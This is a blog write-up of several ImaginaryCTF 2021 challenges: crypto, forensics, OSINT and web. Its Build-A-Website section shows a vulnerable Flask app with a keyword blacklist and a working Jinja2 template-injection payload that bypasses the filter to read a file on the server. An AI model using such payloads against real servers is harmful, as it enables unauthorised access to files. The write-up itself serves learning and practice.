---
title: "CTF - ImaginaryCTF 2021"
categories: [ctf]
date: 2021-02-20
comments: true
image: /images/writeups/ImaginaryCTF/icon.png
description: CTF - ImaginaryCTF 2021
---

# ImaginaryCTF 2021

<p align="center">
  <img src="/images/writeups/ImaginaryCTF2021/logo.jpg" width="70%"/>
</p>


Hello! I'm back at playing CTFs and as always, I've participated in this CTF for team [ISwearIGoogledIt](https://ctftime.org/team/109689) and got some challenges! 


---

Challenge index:


### Crypto
- [Chicken Caesar Salad](#chicken-caesar-salad)


### Forensic
- [Hidden](#hidden)


### Forensic / OSINT
- [Unpuzzled 1 and Unpuzzled 2](#unpuzzled-1-and-unpuzzled-2)
- [Vacation](#vacation)


### Web
- [Roos_World](#roos-world)
- [Build-A-Website](#build-a-website)


<small><i><a href="https://github.com/kashmir54/md-toc">Table of contents generated with md-toc</a></i></small>


---

# Crypto


## Chicken Caesar Salad

I remember the good old days when Caesar ciphers were easy…

Attachments

https://imaginaryctf.org/r/5363-chicken-caesar-salad.txt


We have this text:

```
qkbn{ePmv_lQL_kIMamZ_kQxpMZa_oMb_aW_pIZl}
```

Let's apply the Caesar Cypher or ROT cypher until a ratation leads into the "ictf". I'm using [CyberChef](https://gchq.github.io/CyberChef/):

```
ictf{wHen_dID_cAEseR_cIphERs_gEt_sO_hARd}
```


---

# Forensic

## Hidden

Oh no, someone hid my flag behind a giant red block! Please help me retrieve it!!

Attachments

https://imaginaryctf.org/r/10C4-challenge.psd


Seems like a Photoshop file, and for the hints in the description, we will have to open it and check the flag:

<p align="center">
  <img src="/images/writeups/ImaginaryCTF2021/Forensic/1_flag.png" width="70%"/>
</p>

```
ictf{wut_how_do_you_see_this}
```



---

# Forensic / OSINT

## Unpuzzled 1 and Unpuzzled 2

Puzzler7's evil twin was lurking around somewhere. In our Discord server there is an user who goes by the name unpuzzler7. OSINT him to get the flag. (Note: the flag for this challenge ends with 1032}.)

Note: DO NOT stalk/OSINT puzzler7#7657. This will not help you solve this challenge, and will only lead you away from the right solution.


By using Google we found the [YouTube channel](https://www.youtube.com/channel/UC4k0PKjkIj8n2y3NdRtS8ig/about) but I could not get any relevant information from there. Also tried the waybackmachine over the about page but nothing appeared.

I used sherlock to find any other social media, since there is no Twitter, Facebook or Instagram with tha username. Results are:

```
kali@kali:/opt/sherlock/sherlock$ python3 sherlock.py unpuzzler7
[*] Checking username unpuzzler7 on:
[+] ICQ: https://icq.im/unpuzzler7
[+] Quora: https://www.quora.com/profile/unpuzzler7
[+] Repl.it: https://repl.it/@unpuzzler7
```

First one and second one are false positives, but the third one... Looks promising since the user has some replies. Let's take a look to the flag one:

<p align="center">
  <img src="/images/writeups/ImaginaryCTF2021/Forensic/1_osint_rply.png" width="70%"/>
</p>

We have some JSFuck, but decoding it doesn't seem to be the solution

<p align="center">
  <img src="/images/writeups/ImaginaryCTF2021/Forensic/2_osint_rply.png" width="70%"/>
</p>

Decoded JSFuck:

```
alert("jctf{n0t_th3_fl4g} BUT YOU SHOULD SUBSCRIBE TO MY UNPUZZLING SERVICE!!!!!!!!!!!!!!!")
```

I kept going over those replit items and in the DiscordBot I found the following base64 code...

<p align="center">
  <img src="/images/writeups/ImaginaryCTF2021/Forensic/3_osint_rply.png" width="70%"/>
</p>

```aWN0ZntyM3BsMXRfMXNudF90aDNfcGw0YzNfdDBfc3QwcjNfczNjcjN0c18xY2IyNjE0OH0=```

Decoded:

```ictf{r3pl1t_1snt_th3_pl4c3_t0_st0r3_s3cr3ts_1cb26148}```


Seems like I got the flag from another Unpuzzled2... 


Rewinding into the Unpuzzled1... He is talking about services... Looking for unpuzzler7 in GitHub I found a line of code with its name [here](https://github.com/realunpuzzler7/cyberpatriot-stuff/blob/98f0a37d45f06a9c693b31f7d83bb1f4001bc2ad/README.md) and his [GitHub profile](https://github.com/realunpuzzler7). 


On one of the files we can see a GMail:

```
if anyone is orz at pwn please send me an email at unpuzzler7@gmail.com 
```

At the end could find the solution to Unpuzzled 1 :(



## Vacation

Roo's cousin was on vacation, but he forgot to tell us where he went! But he posted this image on his social media. Could you track down his location? Submit your answer as ictf{latitude_longitude}, with both rounded to 3 decimal places. Example: ictf{-12.345_42.424} (Note: only the image is needed for this challenge, as this is an OSINT challenge.)

<p align="center">
  <img src="/images/writeups/ImaginaryCTF2021/Forensic/image.jpg" width="70%"/>
</p>


In the image we can see the Rock Shop of Tahoe Hemp Company. A quick search on GMaps will do the work. Location was found [here](https://www.google.com/maps/@38.94711,-119.9614202,3a,75y,62.45h,95.14t/data=!3m6!1e1!3m4!1soFk1nXrY9AhpaaIpQOhM2g!2e0!7i16384!8i8192)

<p align="center">
  <img src="/images/writeups/ImaginaryCTF2021/Forensic/4_location.jpg" width="70%"/>
</p>

Using the coordinates in the URL will make the work for the flag:

```ictf{38.947_-119.961}```



---


# Web

## Roos_World
Description

Somebody hid Roo's flag on his website. Roo really needs some help.

Attachments

http://roos-world.chal.imaginaryctf.org

In the website we can see in the inspector a JSFuck code (esoteric language) so we can use an [online decoder](https://enkhee-osiris.github.io/Decoder-JSFuck/).

```
  [][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+...
```

Decoded JSFuck:

```
console.log(atob("aWN0ZnsxbnNwM2N0MHJfcjAwX2cwZXNfdGgwbmt9"));
```

Since it use the atob function, let's use CyberChef to decode the Base64:

```
ictf{1nsp3ct0r_r00_g0es_th0nk}
```

## Build-A-Website

I made a website where y'all can create your own websites! Should be considerably secure even though I'm a bit rusty with Flask.

Attachments

https://imaginaryctf.org/r/3ACF-app.py http://build-a-website.chal.imaginaryctf.org/

The website has the following code running in the back:

{% highlight python %}

  #!/usr/bin/env python3

  from flask import Flask, render_template_string, request, redirect, url_for
  from base64 import b64encode, b64decode

  app = Flask(__name__)

  @app.route('/')
  def index():
    # i dont remember how to return a string in flask so
    # here goes nothing :rooNervous:
    return render_template_string(open('templates/index.html').read())

  @app.route('/backend')
  def backend():
    website_b64 = b64encode(request.args['content'].encode())
    return redirect(url_for('site', content=website_b64))

  @app.route('/site')
  def site():
    content = b64decode(request.args['content']).decode()
    #prevent xss
    blacklist = ['script', 'iframe', 'cookie', 'document', "las", "bas", "bal", ":roocursion:"] # no roocursion allowed
    for word in blacklist:
      if word in content:
        # this should scare them away
        content = "*** stack smashing detected ***: python3 terminated"
    csp = '''<head>\n<meta http-equiv="Content-Security-Policy" content="default-src 'none'">\n</head>\n'''
    return render_template_string(csp + content)

{% endhighlight %}


To approach this task I focused on the user input _request.args['content']_ and the last line where the template is rendered. Since the user input is rendered later, we might exploit [Server Side Template Injection (SSTI)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection). 

To detect this vulnerability I checked the following payload since it is a Flask application:

```{{7*7}}```

<p align="left">
  <img src="/images/writeups/ImaginaryCTF2021/Web/1_template.jpg" width="40%"/>
</p>

<p align="right">
  <img src="/images/writeups/ImaginaryCTF2021/Web/2_execution.jpg" width="40%"/>
</p>

As we can see, the code is executed, therefore we can try to explote this vulnerability.
The purpose is to read the flag file (?) or to execute code in the server. For that, we will need to call the **File** class in order to read its content, so we can use MRO (Method Resolution Order) to map 

```
{{""["__cl" + "ass__"]}}
```


<p align="center">
  <img src="/images/writeups/ImaginaryCTF2021/Web/3_class.jpg" width="70%"/>
</p>

```
{{""["__cl" + "ass__"].__mro__}}
```

<p align="center">
  <img src="/images/writeups/ImaginaryCTF2021/Web/4_mro.jpg" width="70%"/>
</p>


```
{{""["__cl" + "ass__"].__mro__[1]["__subcl" + "asses__"]()}}
```

<p align="center">
  <img src="/images/writeups/ImaginaryCTF2021/Web/5_subclasses.jpg" width="70%"/>
</p>


Now we have a great set of classes that we can access to. Let's find out with one that can be used to read files.

{% highlight python %}

import re

classes = "[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, ...]"

results = re.findall(r'<class \'(\S*)\'>', classes) 
counter = 0

for cl in results:
  if 'file' in cl.lower():
    print(counter, cl)
  counter += 1 

{% endhighlight %}

I see that the number 99 (FileLoader) may fit our purpose:

```
99 _frozen_importlib_external.FileLoader
103 _frozen_importlib_external.FileFinder
250 zipfile.ZipInfo
251 zipfile.LZMACompressor
252 zipfile.LZMADecompressor
253 zipfile._SharedFile
254 zipfile._Tellable
255 zipfile.ZipFile
256 zipfile.Path
269 email.feedparser.BufferedSubFile
273 tempfile._RandomNameSequence
274 tempfile._TemporaryFileCloser
275 tempfile._TemporaryFileWrapper
276 tempfile.SpooledTemporaryFile
277 tempfile.TemporaryDirectory
308 gunicorn.pidfile.Pidfile
315 argparse.FileType
356 gunicorn.http.wsgi.FileWrapper
406 werkzeug.datastructures.FileStorage
418 werkzeug.wsgi.FileWrapper
492 click._compat._AtomicFile
493 click.utils.LazyFile
494 click.utils.KeepOpenFile
```

Now, the [documentation](https://docs.python.org/3/library/importlib.html) is checked to see how we can open and read a file:

<p align="center">
  <img src="/images/writeups/ImaginaryCTF2021/Web/6_fileloader.jpg" width="70%"/>
</p>

Following the documentation, we crafted the following payload:

```
{{""["__cl" + "ass__"].__mro__[1]["__subcl" + "asses__"]()[99]("flag.txt", "flag.txt").get_data("flag.txt")}}
```

<p align="center">
  <img src="/images/writeups/ImaginaryCTF2021/Web/7_flag.jpg" width="70%"/>
</p>

```ictf{:rooYay:_:rooPOG:_:rooHappy:_:rooooooooooooooooooooooooooo:}```